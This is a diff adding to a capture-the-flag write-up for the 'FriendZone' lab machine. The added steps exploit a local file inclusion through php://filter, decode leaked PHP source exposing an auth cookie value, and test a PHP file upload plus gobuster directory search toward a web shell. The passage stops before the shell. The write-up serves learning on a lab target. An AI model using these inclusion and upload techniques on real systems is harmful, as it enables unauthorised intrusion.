@@ -213,7 +213,7 @@ Notes:
    
 5. Visit http://10.10.10.123:443
    - HTTP Response
-     ```
+     ```html
      <h1>Bad Request</h1>
      <p>Your browser sent a request that this server could not understand.<br />
      Reason: You're speaking plain HTTP to an SSL-enabled server port.<br />
@@ -309,7 +309,7 @@ Notes:
       10.10.10.123    friendzone.red
       10.10.10.123    administrator1.friendzone.red
       10.10.10.123    hr.friendzone.red             \\\DEAD END
-      10.10.10.123    uploads.friendzone.red        \\\DEAD END
+      10.10.10.123    uploads.friendzone.red        
 
       # The following lines are desirable for IPv6 capable hosts
       ::1     localhost ip6-localhost ip6-loopback
@@ -355,9 +355,141 @@ Notes:
      ```
    Notes:
    - The __image_id__ parameter is loaded from a directory __images/__
-   - __pagename__ might be exploitable
+   - The __pagename__ parameter might be exploitable
 ---
 
 ## PART 3 : Generate User Shell
 
 1. Exploit __pagename__ parameter from https://administrator1.friendzone.red/dashboard.php
+   - Attempt LFI using __php://filter__
+     ```
+     /dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=timestamp
+     ```
+     Using __php://filter__ works:
+     ```html
+     <title>FriendZone Admin !</title>
+     <br><br><br>
+     <center><h2>Smart photo script for friendzone corp !</h2></center>
+     <center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>
+     <center><img src='images/a.jpg'></center>
+     <center><h1>Something went worng ! , the script include wrong param !</h1></center>
+     PD9waHAKCgokdGltZV9maW5hbCA9IHRpbWUoKSArIDM2MDA7CgplY2hvICJGaW5hbCBBY2Nlc3MgdGltZXN0YW1wIGlzICR0aW1lX2ZpbmFsIjsKCgo/Pgo=
+     ```
+     Decoding the __base64__ output:
+     ```console
+     echo PD9waHAKCgokdGltZV9maW5hbCA9IHRpbWUoKSArIDM2MDA7CgplY2hvICJGaW5hbCBBY2Nlc3MgdGltZXN0YW1wIGlzICR0aW1lX2ZpbmFsIjsKCgo/Pgo= | base64 --decode
+     ```
+     The source code for __timestamp.php__ appears:
+     ```PHP
+     <?php
+
+
+     $time_final = time() + 3600;
+
+     echo "Final Access timestamp is $time_final";
+
+
+     ?>
+     ```
+   - Now try reading other files (e.g. dashboard.php)
+     ```
+     /dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=dashboard
+     ```
+     Page Source:
+     ```html
+     <title>FriendZone Admin !</title>
+     <br><br><br>
+     <center><h2>Smart photo script for friendzone corp !</h2></center>
+     <center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>
+     <center><img src='images/a.jpg'></center>
+     <center><h1>Something went worng ! , the script include wrong param !</h1></center>
+     PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo=
+     ```
+     Decoding the __base64__ output:
+     ```console
+     echo PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo= | base64 --decode
+     ```
+     The source code for __timestamp.php__ appears:
+     ```PHP
+     <?php
+
+     //echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
+     //echo "<center><h3>* Note : we are dealing with a beginner php developer andthe application is not tested yet !</h3></center>";
+     echo "<title>FriendZone Admin !</title>";
+     $auth = $_COOKIE["FriendZoneAuth"];
+
+     if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
+       echo "<br><br><br>";
+
+       echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
+       echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
+
+       if(!isset($_GET["image_id"])){
+         echo "<br><br>";
+         echo "<center><p>image_name param is missed !</p></center>";
+         echo "<center><p>please enter it to show the image</p></center>";
+         echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
+       } else {
+         $image = $_GET["image_id"];
+         echo "<center><img src='images/$image'></center>";
+
+         echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
+         include($_GET["pagename"].".php");
+         //echo $_GET["pagename"];
+       }
+     } else {
+       echo "<center><p>You can't see the content ! , please login !</center></p>";
+     }
+     ?>
+     ```
+     Notes:
+     - __dashboard.php__ gets the filename of PHP files and then adds the extension __.php__
+     - Upload a malicious PHP file and access it using __dashboard.php__
+   
+2. Explore https://uploads.friendzone.red
+   - Page Source:
+     ```html
+     <title>FriendZone Escape software upload manager</title>
+
+     <body>
+     <center><h2>Want to upload Stuff ??</h2></center>
+
+     <form action="upload.php" method="post" enctype="multipart/form-data">
+         Select an image to upload (only images):
+         <input type="file" name="imageu" id="file">
+         <input type="hidden" name="image">
+         <input type="submit" value="Upload" name="Upload">
+     </form>
+
+     </body>
+     ```
+   - Test if it accepts non-image files
+     - Create payload (__test.php__)
+       ```console
+       echo "<?php echo \"hello world\"; ?>" > test.php
+       ```
+     - Response after uploading __test.php__
+       ```html
+       Uploaded successfully !<br>1555476301
+       ```
+     Notes:
+     - It accepts non-image files
+     - The directory of the uploaded files is still unknown
+   - Find the uploaded files
+     ```console
+     gobuster -k -u https://uploads.friendzone.red/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt 
+     
+     # /files (Status: 301)
+     
+     gobuster -k -u https://uploads.friendzone.red/files -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt
+     
+     # /note (Status: 200)
+     ```
+     Visiting https://uploads.friendzone.red/files/note
+     ```
+     under development !
+     ```
+     Note:
+     - Perhaps "under development" points to the __Development share__ from earlier
+     
+3. Linking the __Development share__ and __dashboard.php__
